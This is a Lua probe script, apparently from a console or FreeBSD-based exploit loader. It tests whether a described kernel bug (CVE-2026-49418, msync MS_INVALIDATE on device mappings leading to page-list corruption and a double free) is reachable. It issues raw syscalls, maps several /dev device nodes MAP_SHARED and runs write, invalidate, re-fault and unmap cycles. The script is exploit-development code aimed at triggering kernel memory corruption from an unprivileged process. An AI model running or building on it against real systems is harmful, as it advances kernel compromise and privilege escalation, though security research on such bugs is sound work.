-- CRASH_CLASS: RISKY
-- PROBE 455a: msync(MS_INVALIDATE) on device-backed mappings (CVE-2026-49418)
--
-- FreeBSD-SA-26:37.vm / CVE-2026-49418: on an unmanaged device object,
-- msync(MS_INVALIDATE) marks the pages invalid but leaves them in the pager's
-- page list; a later fault re-inserts the page and corrupts the list, and
-- destroying the mapping frees the page twice. Unprivileged, needs a device
-- that provides memory-mapped I/O.
--
-- msync is syscall 65 (PR #70 corrected 226, which is a nosys stub).
-- FreeBSD flags: MS_ASYNC 1, MS_INVALIDATE 2, MS_SYNC 4.
--
-- The question here is only reachability: does msync(INVALIDATE) return at all
-- on a device mapping, and does the mapping still fault afterwards.

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u64(h, l)
    return uint64(string.format("0x%X%08X", h % 0x100000000, l % 0x100000000))
end
local function sgn(v)
    local h, l = 0, 0
    if type(v) == "table" and v.h then h, l = v.h, v.l else l = tonumber(v) or 0 end
    if h == 0xFFFFFFFF and l == 0xFFFFFFFF then return -1 end
    if h >= 0x80000000 and h < 0xFFFFFFFF then return -1 end
    return l
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return nil
end
local function put_name(s)
    local b = memory.alloc(#s + 1)
    local i = 0
    while i < #s do memory.write_byte(b + i, string.byte(s, i + 1)); i = i + 1 end
    memory.write_byte(b + #s, 0)
    return b
end

local sc_open, sc_close = make_syscall(5), make_syscall(6)
local sc_mmap, sc_munmap = make_syscall(477), make_syscall(73)
local sc_msync = make_syscall(65)
local sc_pid = make_syscall(20)

local Z, NEG = uint64(0), u64(0xFFFFFFFF, 0xFFFFFFFF)
local MS_INVALIDATE, MS_SYNC, MS_ASYNC = 2, 4, 1
local PAGE = 0x4000

print("=== PROBE 455a: MSYNC(MS_INVALIDATE) ON DEVICE MAPPINGS ===")
print("")

local okc, pid = pcall(function() return sc_pid() end)
print(string.format("canary getpid rv=%s", tostring(okc and sgn(pid) or "THREW")))
if not okc then print("loader unhealthy, DONE"); return end

local function mmap(size, prot, flags, fd, off)
    local ok, v = pcall(function() return sc_mmap(Z, uint64(size), uint64(prot), uint64(flags), fd, uint64(off)) end)
    if not ok then return nil end
    local s = sgn(v)
    if s < 0 or s == 0 then return nil end
    -- rebuild full 64-bit value: low half from l, high from h
    local h, l = 0, s
    if type(v) == "table" and v.h then h, l = v.h, v.l end
    return h * 4294967296 + l
end

local function unmap(addr, size)
    return sgn(sc_munmap(uint64(addr), uint64(size)))
end

local function fault_cycle(tag, addr, size)
    -- write a page, invalidate, fault the same page, then destroy
    local w0 = pcall(function() memory.write_dword(addr, 0x41414141) end)
    local before = rd(addr)
    local okm, rvm = pcall(function() return sc_msync(uint64(addr), uint64(size), uint64(MS_INVALIDATE)) end)
    local rm = okm and sgn(rvm) or "THREW"
    local after_msync = rd(addr)
    local w1 = pcall(function() memory.write_dword(addr, 0x42424242) end)
    local after_fault = rd(addr)
    local okS, rvS = pcall(function() return sc_msync(uint64(addr), uint64(size), uint64(MS_SYNC)) end)
    local okA, rvA = pcall(function() return sc_msync(uint64(addr), uint64(size), uint64(MS_ASYNC)) end)
    print(string.format("  %-22s w0=%s rd=%s msync(INV)=%s after=%s fault-write=%s rd2=%s sync=%s async=%s",
        tag, tostring(w0), before and string.format("0x%X", before) or "nil", tostring(rm),
        after_msync and string.format("0x%X", after_msync) or "nil", tostring(w1),
        after_fault and string.format("0x%X", after_fault) or "nil",
        tostring(okS and sgn(rvS) or "THREW"), tostring(okA and sgn(rvA) or "THREW")))
end

print("[A] control: anonymous mapping (prot 3, MAP_ANON)")
local anon = mmap(PAGE, 3, 0x1002, NEG, 0)
if anon then
    fault_cycle("anon", anon, PAGE)
    print(string.format("  munmap=%d", unmap(anon, PAGE)))
else
    print("  mmap failed")
end

print("[B] GPU-shaped mapping (prot 0x33, MAP_ANON)")
local gpu = mmap(PAGE, 0x33, 0x1002, NEG, 0)
if gpu then
    fault_cycle("gpu", gpu, PAGE)
    print(string.format("  munmap=%d", unmap(gpu, PAGE)))
else
    print("  mmap failed")
end

print("[C] device nodes mapped MAP_SHARED")
local nodes = { "/dev/dmem0", "/dev/gc", "/dev/dce", "/dev/camera", "/dev/gic", "/dev/dce" }
for _, path in ipairs(nodes) do
    local name = put_name(path)
    local okf, fd = pcall(function() return sc_open(name, uint64(2), uint64(0)) end)
    local f = okf and sgn(fd) or -1
    if f >= 0 then
        local p1 = mmap(PAGE, 3, 0x0001, uint64(f), 0)   -- MAP_SHARED
        local p2 = mmap(PAGE, 0x33, 0x0001, uint64(f), 0)
        print(string.format("  %-14s fd=%d mmap(SHARED)=%s mmap(0x33)=%s", path, f,
            p1 and string.format("0x%X", p1) or "nil", p2 and string.format("0x%X", p2) or "nil"))
        local m = p2 or p1
        if m then
            fault_cycle(path, m, PAGE)
            print(string.format("  %-14s munmap=%d", path, unmap(m, PAGE)))
        end
        pcall(function() return sc_close(uint64(f)) end)
    else
        print(string.format("  %-14s open rv=%d", path, f))
    end
end

print("")
print("=== 455a DONE (process survived every step) ===")
